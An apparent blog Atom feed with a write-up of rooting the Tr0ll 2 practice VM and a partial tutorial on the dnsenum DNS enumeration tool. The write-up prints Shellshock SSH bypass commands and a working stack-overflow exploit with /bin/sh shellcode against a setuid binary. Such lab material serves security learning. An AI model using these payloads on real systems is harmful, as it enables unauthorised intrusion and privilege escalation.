<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-06-06T10:22:07-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Tr0ll 2 - There be trolls]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls/"/>
    <updated>2017-06-06T08:58:25-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls</id>
    <content type="html"><![CDATA[<p>It&rsquo;s time to slay the second troll in the Tr0ll series!</p>

<!-- more -->


<p>First, a bit of enumeration:</p>

<p>```
Currently scanning: Finished!   |   Screen View: Unique Hosts</p>

<p> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor            <br/>
 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor            <br/>
 192.168.217.129 00:0c:29:cb:3d:2e      1      60  Unknown vendor            <br/>
 192.168.217.254 00:50:56:f3:f4:fc      1      60  Unknown vendor <br/>
```</p>

<p>The IP we want is 192.168.217.129.</p>

<p>```
nmap -p- -sV -T4 192.168.217.129</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-05-30 10:27 EDT
Nmap scan report for 192.168.217.129
Host is up (0.000088s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
MAC Address: 00:0C:29:CB:3D:2E (VMware)
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```</p>

<p>You know the drill! Something awaits us on that web server!</p>

<p><img class="center" src="/images/pentest/tr0ll2/troll.png" title="&lsquo;troll&rsquo; &lsquo;troll&rsquo;" ></p>

<p>And a comment in the source:</p>

<p>``` html</p>

<p><!--Nothing here, Try Harder!>
<!--Author: Tr0ll>
<!--Editor: VIM>
```</p>

<p>I downloaded the image and ran it through exiftool, but found nothing. Next I looked if there&rsquo;s a robots.txt file, and there was..but, oh, the horror:</p>

<p><code>
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
</code></p>

<p>Ok, let&rsquo;s look (sigh). I went through them and only hit on a bunch of 404s and this image in a couple of directories:</p>

<p><img class="center" src="/images/pentest/tr0ll2/noob.png" title="&lsquo;noob&rsquo; &lsquo;noob&rsquo;" ></p>

<p>Exiftool again..and nothing again..Also tried cat_the_troll as a directory name, nothing there either. A little bit anticlimactic, but remembering the HTML comment of a Tr0ll author, what worked was logging into the FTP server with the credentials of Tr0ll/Tr0ll:</p>

<p><code>
ftp 192.168.217.129
Connected to 192.168.217.129.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.217.129:root): Tr0ll
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
226 Directory send OK.
ftp&gt; get lmao.zip
local: lmao.zip remote: lmao.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
226 Transfer complete.
1474 bytes received in 0.00 secs (8.4682 MB/s)
</code></p>

<p>After downloading the archive, I tried extracting it, but of course there&rsquo;s a password. Tried a couple of guesses, nothing worked. Lastly, I tried SSH with the same credentials, and although it worked, the session ended instantly.</p>

<p>Back to the web, I decided to download all the cat troll images, since they were in different directories, and might be different themselves:</p>

<p><code>
ls -l
total 68
-rw-r--r-- 1 root root 15873 May 30 11:48 dont_bother_cat_the_troll.jpg
-rw-r--r-- 1 root root 15831 May 30 11:48 keep_trying_cat_the_troll.jpg
-rw-r--r-- 1 root root  1474 May 30 11:38 lmao.zip
-rw-r--r-- 1 root root 15831 May 30 11:47 noob_cat_the_troll.jpg
-rw-r--r-- 1 root root 15831 May 30 11:49 ok_this_is_it_cat_the_troll.jpg
</code></p>

<p>I set the names to reflect the directories where I got them from. It seems one of them is bigger than the rest. Nothing from exiftool, this time I just tried strings and at the end of the output was this line:</p>

<p><code>
Look Deep within y0ur_self for the answer
</code></p>

<p>Finally, getting somewhere. The hint is probably a directory name on the web server, so I went there and did find an answer.txt file. Unfortunately, it was full of what looked like Base64 strings, and massive:</p>

<p><code>
wc -l answer.txt
99157 answer.txt
</code></p>

<p>I decoded it with the command: <code>base64 -d answer.txt > decoded.txt</code>, but how to figure the answer in all this sea of trolling? I remembered the troll&rsquo;s fixation on using underscores, so I tried doing a recursive grep for that:</p>

<p><code>
grep -r "_" decoded.txt
noooob_lol
</code></p>

<p>That didn&rsquo;t work as a password. Next I looked for longest line:</p>

<p><code>
wc -L decoded.txt
30 decoded.txt
</code></p>

<p>According to this command, the longest line&rsquo;s length is 30. I whipped up a quick Python script to find all lines with the length of 30:</p>

<p>``` python</p>

<h1>!/usr/bin/env python</h1>

<p>import argparse</p>

<p>desc = &ldquo;Find and print lines from a file that are a certain length&rdquo;
parser = argparse.ArgumentParser(description=desc)</p>

<h1>length argument</h1>

<p>parser.add_argument(</p>

<pre><code>'-l',
help = 'Length value',
dest = 'length',
type = int,
required=True
</code></pre>

<p>)</p>

<h1>file add_argument</h1>

<p>parser.add_argument(</p>

<pre><code>'-f',
help = 'Filename',
dest = 'filename',
type = str,
required=True
</code></pre>

<p>)</p>

<p>args = parser.parse_args()</p>

<p>with open(args.filename, &ldquo;r&rdquo;) as f:</p>

<pre><code>for line in f.readlines():
    # strip the newline character for accurate counting
    if len(line.strip('\n')) == args.length:
        print line
</code></pre>

<p>```</p>

<p>Ran it and BOOM:</p>

<p><code>
python line_length.py -l 30 -f decoded.txt
ItCantReallyBeThisEasyRightLOL
</code></p>

<p>This sounds exactly like the troll! Now I was finally able to extract the archive:</p>

<p><code>
unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password:
  inflating: noob            
</code></p>

<p>It looks like it&rsquo;s a private key:</p>

<p><code>
file noob
noob: PEM RSA private key
</code></p>

<p>I tried SSH'ing as noob this time:</p>

<p><code>
ssh -i noob noob@192.168.217.129
TRY HARDER LOL!
Connection to 192.168.217.129 closed.
</code></p>

<p>Well, that didn&rsquo;t help much. I tried appending commands, but I still got kicked out instantly without running anything. After a bit of head scratching and Google, I got reminded that SSH can be vulnerable to Shellshock, if it meets certain requirements, which are: an unpatched bash (doh), authentication using <code>authorization_keys</code>, and the user in question being restricted in the commands they could run. As it so happens, we have an old machine that may not be patched, key-based authentication, and it makes sense that a user called noob would be restricted!</p>

<p>First, a recap. The Shellshock string is <code>() { :; };</code>, and if followed by a command, that command gets executed. I tried it and:</p>

<p><code>
ssh -i noob noob@192.168.217.129 -t "() { :; }; pwd"
/home/noob
TRY HARDER LOL!
Connection to 192.168.217.129 closed.
</code></p>

<p>Excellent! The previous -t flag of the SSH command is useful when you want to run interactive applications on the remote server. Now let&rsquo;s see if we can spawn a shell:</p>

<p><code>
ssh -i noob noob@192.168.217.129 -t "() { :; }; /bin/bash"
noob@Tr0ll2:~$ uname -a
Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
</code></p>

<p>Finally, we&rsquo;re in! Before continuing though, I thought it would be helpful to better understand how Shellshock works.</p>

<h3>Shellshock explained</h3>

<p>Because Bash is a scripting language, you can do things like defining functions:</p>

<p><code>
myfunction() { echo "I am a function"; }
</code></p>

<p>And then you call it:</p>

<p><code>
noob@Tr0ll2:~$ myfunction
I am a function
</code></p>

<p>You can also export functions to environment variables, so they can be run by new bash instances:</p>

<p><code>
noob@Tr0ll2:~$ export -f myfunction
noob@Tr0ll2:~$ env
[...]
myfunction=() {  echo "I am a function"
}
</code></p>

<p>Now the function definition is inside the environment variable, and it can be evaluated:</p>

<p><code>
bash -c myfunction
I am a function
</code></p>

<p>This is intended behavior so far, but there is a vulnerability in which the evaluation continues even after the function end.</p>

<p><code>
export shocking='() { echo "This is safe" ; }; echo "This is NOT safe"'
bash -c shocking
This is NOT safe
This is safe
</code></p>

<p>Here you can see the vulnerability: the second echo statement was outside the function definition, but it was executed anyway.</p>

<p>Next, the attack fools the shell into accepting a bogus function definition. You can use <a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">this string</a> to see if your bash is vulnerable to Shellshock: <code>x=&lsquo;() { :;}; echo VULNERABLE&rsquo; bash -c :</code>.</p>

<p>Now we know that what looked like gibberish before, is actually the syntax for defining functions. With a diference of a colon instead of a function statement. The <code>:</code> is a []shell built-in(<a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b</a>) that does nothing. So, to the vulnerable shell, the function definition doesn&rsquo;t perform any action, and is then followed by an arbitrary command, that is happily executed: <code>() { :;}; CODE</code>.</p>

<p>Ok, back to the Tr0ll! To also confirm the SSH vulnerability, look in authorized_keys:</p>

<p><code>
noob@Tr0ll2:~$ cat .ssh/authorized_keys
command="echo TRY HARDER LOL!" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwi2G/kLMyjm/rrcQymKVqy4EgUyJ+3Oyv7D5QV73IWECguqrINI+OuY+zIV49ykebBYR15HkBYi/9GYZmHRD5CHq9I+zCLHv/9Kdf9Ae+HQIaF/X/3PC0lIx6XLmgIY66MwuMNmOvK7U8rERPUJxSmLKWvaSAP9/LXVOHfcrCZyyCc+ir6kxsKHzojM0EResF2RgKfbbZ2MFqr6YSO9+ohdZBgGVncc1ngtW0b7mKf1u+RTnP7XeWxOkD2nHpghvKs8wwXNw6vE12lNjzqjPDTb4yYVph8zHKPYZst6PT6qeLArJ7lKwX540FEp2q9Ji2xUTXVLBCYXiKZ0k7Ru69 noob@Tr0ll2
</code></p>

<p>There it is, the trolling message was the command that user noob was restricted to. Ok, let&rsquo;s move on and see how we can get root. I searched for some kernel exploits, but could only find some potential exploits for 64 bit systems, and this one is 32 bit. But then:</p>

<p><code>
ls /
bin   dev  home        lib     media  nothing_to_see_here  proc  run   selinux  sys  usr  vmlinuz
boot  etc  initrd.img  lost+found  mnt    opt              root  sbin  srv      tmp  var
</code></p>

<p>Didn&rsquo;t expect to get anything out of this, but..trolls..</p>

<p>```
noob@Tr0ll2:/$ file nothing_to_see_here/
nothing_to_see_here/: setuid directory
noob@Tr0ll2:/$ ls -l nothing_to_see_here/
total 4
drwsr-xr-x 5 root root 4096 Oct  4  2014 choose_wisely
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls -al *
door1:
total 16
drwsr-xr-x 2 root root 4096 Oct  4  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t</p>

<p>door2:
total 20
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t</p>

<p>door3:
total 16
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t
```</p>

<p>I expanded the list of files in these directories so I could see everything at a glance. Let&rsquo;s see what we have:</p>

<p><code>
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ file r00t
r00t: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x4ceb2022ad50bc899c84f5e30793fe06b0a166c0, not stripped
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
Usage: ./r00t input
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t lol
lol
</code></p>

<p>This appears to echo whatever you give it. I tried doing a strings on it but got permission denied error. Moved on to the next executable for now:</p>

<p>```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t
Good job, stand by, executing root shell&hellip;
BUHAHAHA NOOB!
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$
Broadcast message from noob@Tr0ll2</p>

<pre><code>(/dev/pts/0) at 12:57 ...
</code></pre>

<p>The system is going down for reboot NOW!
Connection to 192.168.217.129 closed by remote host.
Connection to 192.168.217.129 closed.
```</p>

<p>Ok..the troll is trying to annoy us..this binary rebooted the machine. I went on to the third and again it restarted! Not much likely for the binaries to be the same, and it was good that I had the initial picture of the binary sizes! It seems the trolling continues..by switching the binaries between directories! Keep in mind the binary sizes, and check often, because they get moved a lot.</p>

<p>``` plain
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t</p>

<p>2 MINUTE HARD MODE LOL
```</p>

<p>Wasn&rsquo;t sure what this one did, until I got a permission denied when running ls :&ndash;) so in those 2 minutes, we are probably stripped by even the basic permissions. By now, it seemed that the only interesting binary would be the one that takes user input (largest one), so I got back to it. I used <code>pattern_create.rb</code> to build a 500 bytes long string and feed it to the binary, and it segfaulted! So, we have a buffer overflow here!</p>

<p><code>plain
Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
</code></p>

<p>Let&rsquo;s see where exactly in the pattern it happens:</p>

<p><code>plain
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x6a413969 -l 500
[*] Exact match at offset 268
</code></p>

<p>Taking a closer look at the registers and stack:</p>

<p>``` plain
(gdb) r $(python -c &ldquo;print &lsquo;A&rsquo; * 268 + &lsquo;B&rsquo; * 4 + &lsquo;C&rsquo; * 16&rdquo;)</p>

<p>Starting program: /nothing_to_see_here/choose_wisely/door3/r00t $(python -c &ldquo;print &lsquo;A&rsquo; * 268 + &lsquo;B&rsquo; * 4 + &lsquo;C&rsquo; * 16&rdquo;)</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info r
eax            0x120    288
ecx            0x0  0
edx            0x0  0
ebx            0xb7fd1ff4   -1208147980
esp            0xbffffb50   0xbffffb50
ebp            0x41414141   0x41414141
esi            0x0  0
edi            0x0  0
eip            0x42424242   0x42424242
eflags         0x210286 [ PF SF IF RF ID ]
cs             0x73 115
ss             0x7b 123
ds             0x7b 123
es             0x7b 123
fs             0x0  0
gs             0x33 51
(gdb) x $esp
0xbffffb50: 0x43434343
```</p>

<p>ESP has been overwritten with part of our string, so we can craft some shellcode and jump to the address of ESP to execute it. I picked the <a href="https://www.exploit-db.com/exploits/40131/">Linux x86 execve /bin/sh</a> shellcode, which is 19 bytes long.</p>

<p>What we have now for a functional exploit:</p>

<ul>
<li><p>268 bytes to fill the buffer</p></li>
<li><p>overwrite EIP with the address of ESP, which is <code>0xbffffb50</code>, and in little endian it is <code>\x50\xfb\xff\xbf</code></p></li>
<li><p>NOP sled for padding</p></li>
<li><p>shellcode: <code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80</code></p></li>
</ul>


<p>Ran the exploit in GDB:</p>

<p><code>
(gdb) r $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
process 1838 is executing new program: /bin/dash
$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
</code></p>

<p>Remember that a shell which you get in GDB has the privileges that GDB runs at, so this is not a real root shell. We have to run it outside GDB. I did so and I got a big..segmentation fault! What worked in GDB didn&rsquo;t work outside it, and as I was getting frustrated, I looked at other writeups, to see if anyone else had the same problem. It seems it should have run smoothly, but there can be a discrepancy in memory between a live environment and a GDB one. I tweaked the ESP address a few times, before hitting the right one:</p>

<p>```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; * 268 + &ldquo;\x90\xfb\xff\xbf&rdquo; + &ldquo;x90&rdquo; * 16 + &ldquo;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80&rdquo;&rsquo;)</p>

<h1>id</h1>

<p>uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)</p>

<h1>ls /root/</h1>

<p>Proof.txt  core1  core2  core3  core4  goal  hardmode  lmao.zip  ran_dir.py  reboot</p>

<h1>cat /root/Proof.txt</h1>

<p>You win this time young Jedi&hellip;</p>

<p>a70354f0258dcc00292c72aab3c8b1e4<br/>
```</p>

<p>The valid ESP address was <code>0xbffffb90</code>. If you try it in GDB though, you will get a segfault there. Ah, this challenge trolled me on so many levels!</p>

<p>```
/ A visit to a fresh place will bring \
\ strange work.                       /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[dnsenum - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/05/29/dnsenum-kali-linux-tools/"/>
    <updated>2017-05-29T05:32:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/05/29/dnsenum-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at dnsenum, one of the tools that come preinstalled on Kali for DNS information gathering.</p>

<!-- more -->


<p>Homepage: <a href="https://github.com/fwaeytens/dnsenum">https://github.com/fwaeytens/dnsenum</a></p>

<h3>dnsenum description</h3>

<blockquote><p>multithreaded perl script to enumerate DNS information of a domain and to discover non-contiguous ip blocks.</p>

<p>OPERATIONS:</p>

<p>1) Get the host&rsquo;s addresse (A record).</p>

<p>2) Get the namservers (threaded).</p>

<p>3) Get the MX record (threaded).</p>

<p>4) Perform axfr queries on nameservers and get BIND VERSION (threaded).</p>

<p>5) Get extra names and subdomains via google scraping (google query = &ldquo;allinurl: -www site:domain&rdquo;).</p>

<p>6) Brute force subdomains from file, can also perform recursion on subdomain that have NS records (all threaded).</p>

<p>7) Calculate C class domain network ranges and perform whois queries on them (threaded).</p>

<p>8) Perform reverse lookups on netranges ( C class or/and whois netranges) (threaded).</p>

<p>9) Write to domain_ips.txt file ip-blocks.</p></blockquote>

<h3>dnsenum options</h3>

<p>``` plain
dnsenum -h
dnsenum.pl VERSION:1.2.3
Usage: dnsenum.pl <a href="">Options</a> <domain>
Note: the brute force -f switch is obligatory.
GENERAL OPTIONS:
  &mdash;dnsserver   <server></p>

<pre><code>        Use this DNS server for A, NS and MX queries.
</code></pre>

<p>  &mdash;enum        Shortcut option equivalent to &mdash;threads 5 -s 15 -w.
  -h, &mdash;help        Print this help message.
  &mdash;noreverse       Skip the reverse lookup operations.
  &mdash;nocolor     Disable ANSIColor output.
  &mdash;private     Show and save private ips at the end of the file domain_ips.txt.
  &mdash;subfile <file>  Write all valid subdomains to this file.
  -t, &mdash;timeout <value> The tcp and udp timeout values in seconds (default: 10s).
  &mdash;threads <value> The number of threads that will perform different queries.
  -v, &mdash;verbose     Be verbose: show all the progress and all the error messages.
GOOGLE SCRAPING OPTIONS:
  -p, &mdash;pages <value>   The number of google search pages to process when scraping names,</p>

<pre><code>        the default is 5 pages, the -s switch must be specified.
</code></pre>

<p>  -s, &mdash;scrap <value>   The maximum number of subdomains that will be scraped from Google (default 15).
BRUTE FORCE OPTIONS:
  -f, &mdash;file <file> Read subdomains from this file to perform brute force.
  -u, &mdash;update  &lt;a|g|r|z></p>

<pre><code>        Update the file specified with the -f switch with valid subdomains.
a (all)     Update using all results.
g       Update using only google scraping results.
r       Update using only reverse lookup results.
z       Update using only zonetransfer results.
</code></pre>

<p>  -r, &mdash;recursion   Recursion on subdomains, brute force all discovred subdomains that have an NS record.
WHOIS NETRANGE OPTIONS:
  -d, &mdash;delay <value>   The maximum value of seconds to wait between whois queries, the value is defined randomly, default: 3s.
  -w, &mdash;whois       Perform the whois queries on c class network ranges.</p>

<pre><code>         **Warning**: this can generate very large netranges and it will take lot of time to performe reverse lookups.
</code></pre>

<p>REVERSE LOOKUP OPTIONS:
  -e, &mdash;exclude <regexp></p>

<pre><code>        Exclude PTR records that match the regexp expression from reverse lookup results, useful on invalid hostnames.
</code></pre>

<p>OUTPUT OPTIONS:
  -o &mdash;output <file>    Output in XML format. Can be imported in MagicTree (www.gremwell.com)
```</p>

<h3>Fix dnsenum whois and autoloader errors</h3>

<p>First, some preliminary troubleshooting information: dnsenum relies on some Perl modules that may not be already on your system. When running it with certain flags, you might see some warnings like this one: Warning: can&rsquo;t load Net::Whois::IP module, whois queries disabled. To fix it, install the module by running <code>perl -MCPAN -e shell</code> and then at the prompt: <code>install Net::Whois::IP</code>. If you try again, you might get a different error, however: Can&rsquo;t locate package AutoLoader for @net::Whois::IP::ISA at /usr/bin/dnsenum line 536. I scoured the Internet for a bit before finding a workaround: you can make it go away by adding <code>require AutoLoader;</code> to the module source code, or by removing the Autuloader reference: changing <code>@ISA = qw(Exporter AutoLoader);</code> to <code>@ISA = qw(Exporter);</code>. To find out where the module is located, use the CPAN tool:</p>

<p>``` plain
cpan -D Net::Whois::IP
Loading internal null logger. Install Log::Log4perl for logging messages
Reading &lsquo;/root/.cpan/Metadata&rsquo;
  Database was generated on Wed, 17 May 2017 06:54:04 GMT</p>

<h2>Net::Whois::IP</h2>

<pre><code>(no description)
B/BS/BSCHMITZ/Net-Whois-IP-1.19.tar.gz
/usr/local/share/perl/5.24.1/Net/Whois/IP.pm
Installed: 1.19
CPAN:      1.19  up to date
Ben Schmitz (BSCHMITZ)
ben@foink.com
</code></pre>

<p>```</p>

<p>You can see the path here, now go apply the fix in the IP.pm file and the error should go away.</p>

<h3>dnsenum usage</h3>

<ul>
<li>default</li>
</ul>


<p>``` plain
dnsenum yahoo.com
dnsenum.pl VERSION:1.2.3</p>

<p>&mdash;&mdash;&ndash;   yahoo.com   &mdash;&mdash;&ndash;</p>

<p>Host&rsquo;s addresses:</p>

<hr />

<p>yahoo.com.                               5        IN    A        206.190.36.45
yahoo.com.                               5        IN    A        98.139.183.24
yahoo.com.                               5        IN    A        98.138.253.109</p>

<p>Name Servers:</p>

<hr />

<p>ns1.yahoo.com.                           5        IN    A        68.180.131.16
ns3.yahoo.com.                           5        IN    A        203.84.221.53
ns4.yahoo.com.                           5        IN    A        98.138.11.157
ns2.yahoo.com.                           5        IN    A        68.142.255.16
ns5.yahoo.com.                           5        IN    A        119.160.247.124</p>

<p>Mail (MX) Servers:</p>

<hr />

<p>mta7.am0.yahoodns.net.                   5        IN    A        98.138.112.32
mta7.am0.yahoodns.net.                   5        IN    A        98.138.112.37
mta7.am0.yahoodns.net.                   5        IN    A        63.250.192.45
mta7.am0.yahoodns.net.                   5        IN    A        66.196.118.34
mta7.am0.yahoodns.net.                   5        IN    A        66.196.118.37
mta7.am0.yahoodns.net.                   5        IN    A        66.196.118.240
mta7.am0.yahoodns.net.                   5        IN    A        98.136.216.26
mta7.am0.yahoodns.net.                   5        IN    A        98.136.217.202
mta5.am0.yahoodns.net.                   5        IN    A        98.138.112.33
mta5.am0.yahoodns.net.                   5        IN    A        98.138.112.34
mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.33
mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.34
mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.35
mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.36
mta5.am0.yahoodns.net.                   5        IN    A        98.136.216.25
mta5.am0.yahoodns.net.                   5        IN    A        98.136.217.202
mta6.am0.yahoodns.net.                   5        IN    A        98.136.216.25
mta6.am0.yahoodns.net.                   5        IN    A        98.138.112.38
mta6.am0.yahoodns.net.                   5        IN    A        98.138.112.37
mta6.am0.yahoodns.net.                   5        IN    A        98.136.217.203
mta6.am0.yahoodns.net.                   5        IN    A        98.138.112.35
mta6.am0.yahoodns.net.                   5        IN    A        66.196.118.36
mta6.am0.yahoodns.net.                   5        IN    A        63.250.192.46
mta6.am0.yahoodns.net.                   5        IN    A        66.196.118.37</p>

<p>Trying Zone Transfers and getting Bind Versions:</p>

<hr />

<p>Trying Zone Transfer for yahoo.com on ns4.yahoo.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for yahoo.com on ns5.yahoo.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for yahoo.com on ns2.yahoo.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for yahoo.com on ns3.yahoo.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for yahoo.com on ns1.yahoo.com &hellip;
AXFR record query failed: REFUSED</p>

<p>brute force file not specified, bay.
```</p>

<p>From this output, you can see that the script performed DNS queries of the yahoo.com domain, enumerated the DNS and mail servers, and attempted zone transfers through the AXFR record type. Successful zone transfers are a misconfiguration that can have serious security impacts, because the DNS server sends its zone records to whoever requested them, thus revealing potentially sensitive information about the internal network topology, etc.</p>

<ul>
<li>with the &mdash;enum shortcut, which includes the flags: &mdash;threads 5 (5 threads), -s 15 (15 maximum subdomains to be scraped from Google), and -w (perform whois queries on class C ranges)</li>
</ul>


<p>``` plain
dnsenum &mdash;enum kali.org
dnsenum.pl VERSION:1.2.3</p>

<p>&mdash;&mdash;&ndash;   kali.org   &mdash;&mdash;&ndash;</p>

<p>Host&rsquo;s addresses:</p>

<hr />

<p>kali.org.                                5        IN    A        192.124.249.10</p>

<p>Name Servers:</p>

<hr />

<p>ns5.no-ip.com.                           5        IN    A        204.16.255.155
ns4.no-ip.com.                           5        IN    A        204.16.254.44
ns1.no-ip.com.                           5        IN    A        204.16.255.55
ns3.no-ip.com.                           5        IN    A        207.34.6.1
ns2.no-ip.com.                           5        IN    A        204.16.254.6</p>

<p>Mail (MX) Servers:</p>

<hr />

<p>aspmx.l.google.com.                      5        IN    A        108.177.15.27
alt3.aspmx.l.google.com.                 5        IN    A        74.125.23.26
alt4.aspmx.l.google.com.                 5        IN    A        74.125.28.26
alt1.aspmx.l.google.com.                 5        IN    A        108.177.14.27
alt2.aspmx.l.google.com.                 5        IN    A        74.125.200.27</p>

<p>Trying Zone Transfers and getting Bind Versions:</p>

<hr />

<p>Trying Zone Transfer for kali.org on ns2.no-ip.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for kali.org on ns4.no-ip.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for kali.org on ns3.no-ip.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for kali.org on ns1.no-ip.com &hellip;
AXFR record query failed: NOTAUTH</p>

<p>Trying Zone Transfer for kali.org on ns5.no-ip.com &hellip;
AXFR record query failed: NOTAUTH</p>

<p>Scraping kali.org subdomains from Google:</p>

<hr />

<p> &mdash;&mdash;   Google search page: 1   &mdash;&mdash;</p>

<p> &mdash;&mdash;   Google search page: 2   &mdash;&mdash;</p>

<p>  docs</p>

<p> &mdash;&mdash;   Google search page: 3   &mdash;&mdash;</p>

<p>  de.docs
  archive</p>

<p> &mdash;&mdash;   Google search page: 4   &mdash;&mdash;</p>

<p>  archive-4
  ja.docs</p>

<p> &mdash;&mdash;   Google search page: 5   &mdash;&mdash;</p>

<p>Google Results:</p>

<hr />

<p>de.docs.kali.org.                        5        IN    A        192.124.249.10
ja.docs.kali.org.                        5        IN    A        192.124.249.10
docs.kali.org.                           5        IN    A        192.124.249.10
archive.kali.org.                        5        IN    CNAME    hera.kali.org.
hera.kali.org.                           5        IN    A        192.99.45.140
archive-4.kali.org.                      5        IN    CNAME    hecate.kali.org.
hecate.kali.org.                         5        IN    A        149.202.201.51</p>

<p>brute force file not specified, bay.
```</p>

<p>One thing that you should keep in mind is that the Google scraping feature might not always work. In that case, you can check manually by using the same Google operator that dnsenum uses, with &ldquo;allinurl:-www site:target.com&rdquo;</p>

<ul>
<li>bruteforce subdomains and perform whois queries</li>
</ul>


<p>dnsenum has a domain bruteforce file located at <code>/usr/share/dnsenum/dns.txt</code>:</p>

<p><code>plain
wc -l /usr/share/dnsenum/dns.txt
1480 /usr/share/dnsenum/dns.txt
</code></p>

<p>Let&rsquo;s see some domain bruteforcing in action! Again, looking at kali.org:</p>

<p>``` plain
dnsenum -f /usr/share/dnsenum/dns.txt -w &mdash;noreverse kali.org
[&hellip;]
Brute forcing with /usr/share/dnsenum/dns.txt:</p>

<hr />

